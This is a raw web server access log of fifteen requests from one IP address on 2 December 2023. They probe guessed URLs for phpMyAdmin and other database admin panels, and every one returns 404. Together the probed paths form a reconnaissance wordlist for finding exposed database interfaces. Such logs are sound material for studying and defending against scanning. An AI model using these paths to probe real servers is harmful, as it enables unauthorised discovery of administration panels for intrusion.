201.168.160.141 - - [02/Dec/2023:15:29:26 +0000] "GET /phpmyadmin2013/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:26 +0000] "GET /database/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:26 +0000] "GET /phpmyadmin2018/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:26 +0000] "GET /phpmyAdmin/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:26 +0000] "GET /phpmyadmin2022/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:26 +0000] "GET /phpmy-admin/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:26 +0000] "GET /db/phpMyAdmin3/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:26 +0000] "GET /mysqlmanager/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:27 +0000] "GET /mysql-admin/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:27 +0000] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:27 +0000] "GET /sqlmanager/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:27 +0000] "GET /dbadmin/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:27 +0000] "GET /phpMyAdmin-5/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:27 +0000] "GET /sql/phpmyadmin5/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:27 +0000] "GET /phpMyAdmin_/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
